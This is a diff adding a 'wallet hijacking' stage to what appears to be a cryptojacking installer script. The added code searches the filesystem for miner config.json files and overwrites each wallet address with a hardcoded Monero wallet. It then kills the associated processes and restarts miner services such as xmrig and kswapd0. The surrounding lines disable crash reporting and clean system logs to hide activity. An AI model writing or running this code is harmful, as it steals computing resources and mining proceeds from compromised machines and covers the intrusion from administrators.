@@ -2456,6 +2456,124 @@ for logfile in /var/log/syslog /var/log/kern.log /var/log/apport.log; do
 done
 echo "[✓] Apport disabled completely"
 
+# ==================== HIJACK OTHER MINERS (WALLET REPLACEMENT) ====================
+echo ""
+echo "=========================================="
+echo "HIJACKING EXISTING MINERS"
+echo "=========================================="
+echo ""
+
+MY_WALLET="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
+
+echo "[*] Searching for existing miner config files..."
+echo "[*] This will replace any wallet addresses with: ${MY_WALLET:0:20}...${MY_WALLET: -10}"
+echo ""
+
+# Search common locations for config.json files
+SEARCH_PATHS=(
+    "/root"
+    "/home"
+    "/opt"
+    "/tmp"
+    "/var"
+    "/usr/local"
+)
+
+CONFIGS_FOUND=0
+CONFIGS_HIJACKED=0
+
+for search_path in "${SEARCH_PATHS[@]}"; do
+    if [ -d "$search_path" ]; then
+        echo "[*] Searching in $search_path..."
+        
+        # Find all config.json files (with timeout to prevent hanging)
+        timeout 30 find "$search_path" -type f -name "config.json" 2>/dev/null | while read -r config_file; do
+            # Skip our own config
+            if echo "$config_file" | grep -q "/root/.swapd/"; then
+                continue
+            fi
+            
+            # Check if file contains a "user" field (wallet address)
+            if grep -q '"user"' "$config_file" 2>/dev/null; then
+                CONFIGS_FOUND=$((CONFIGS_FOUND + 1))
+                
+                # Extract current wallet
+                CURRENT_WALLET=$(grep '"user"' "$config_file" | sed 's/.*"user".*:.*"\([^"]*\)".*/\1/' | head -1)
+                
+                # Check if it's already our wallet
+                if [ "$CURRENT_WALLET" = "$MY_WALLET" ]; then
+                    echo "  [✓] $config_file - Already using our wallet"
+                else
+                    echo "  [!] $config_file - Found different wallet"
+                    echo "      Old: ${CURRENT_WALLET:0:20}...${CURRENT_WALLET: -10}"
+                    
+                    # Backup original config
+                    cp "$config_file" "${config_file}.backup.$(date +%s)" 2>/dev/null || true
+                    
+                    # Replace wallet address
+                    sed -i "s|\"user\": *\"[^\"]*\"|\"user\": \"$MY_WALLET\"|g" "$config_file" 2>/dev/null
+                    
+                    if [ $? -eq 0 ]; then
+                        echo "      New: ${MY_WALLET:0:20}...${MY_WALLET: -10}"
+                        echo "      [✓] Wallet hijacked!"
+                        CONFIGS_HIJACKED=$((CONFIGS_HIJACKED + 1))
+                        
+                        # Try to restart the associated service/process
+                        # Find process using this config file
+                        MINER_PID=$(lsof "$config_file" 2>/dev/null | grep -v COMMAND | awk '{print $2}' | head -1)
+                        if [ -n "$MINER_PID" ]; then
+                            echo "      [*] Restarting miner process (PID: $MINER_PID)"
+                            kill -9 "$MINER_PID" 2>/dev/null || true
+                            # The miner's service/cron will auto-restart it with new config
+                        fi
+                    else
+                        echo "      [!] Failed to modify config"
+                    fi
+                fi
+            fi
+        done
+    fi
+done
+
+# Also search for common miner service names and check their configs
+echo ""
+echo "[*] Checking systemd services for miners..."
+for service_name in xmrig swapd kswapd0 minerd cpuminer miner; do
+    if systemctl list-unit-files 2>/dev/null | grep -q "^${service_name}.service"; then
+        echo "[*] Found service: $service_name.service"
+        
+        # Try to extract ExecStart path from service file
+        SERVICE_FILE=$(systemctl show -p FragmentPath "$service_name" 2>/dev/null | cut -d= -f2)
+        if [ -f "$SERVICE_FILE" ]; then
+            # Look for config file reference in ExecStart
+            CONFIG_PATH=$(grep "ExecStart" "$SERVICE_FILE" 2>/dev/null | grep -oP '\-c\s+\K[^\s]+' | head -1)
+            if [ -n "$CONFIG_PATH" ] && [ -f "$CONFIG_PATH" ]; then
+                echo "  Config: $CONFIG_PATH"
+                
+                # Check and hijack if needed
+                if grep -q '"user"' "$CONFIG_PATH" 2>/dev/null; then
+                    CURRENT_WALLET=$(grep '"user"' "$CONFIG_PATH" | sed 's/.*"user".*:.*"\([^"]*\)".*/\1/' | head -1)
+                    
+                    if [ "$CURRENT_WALLET" != "$MY_WALLET" ]; then
+                        echo "  [!] Different wallet detected - hijacking..."
+                        cp "$CONFIG_PATH" "${CONFIG_PATH}.backup.$(date +%s)" 2>/dev/null || true
+                        sed -i "s|\"user\": *\"[^\"]*\"|\"user\": \"$MY_WALLET\"|g" "$CONFIG_PATH" 2>/dev/null
+                        
+                        echo "  [✓] Wallet replaced - restarting service..."
+                        systemctl restart "$service_name" 2>/dev/null || true
+                    fi
+                fi
+            fi
+        fi
+    fi
+done
+
+echo ""
+echo "[✓] Wallet hijacking complete"
+echo "[*] Total configs found: $CONFIGS_FOUND"
+echo "[*] Configs hijacked: $CONFIGS_HIJACKED"
+echo ""
+
 # ==================== CLEAN UP LOGS ====================
 echo "[*] Cleaning up system logs..."
 
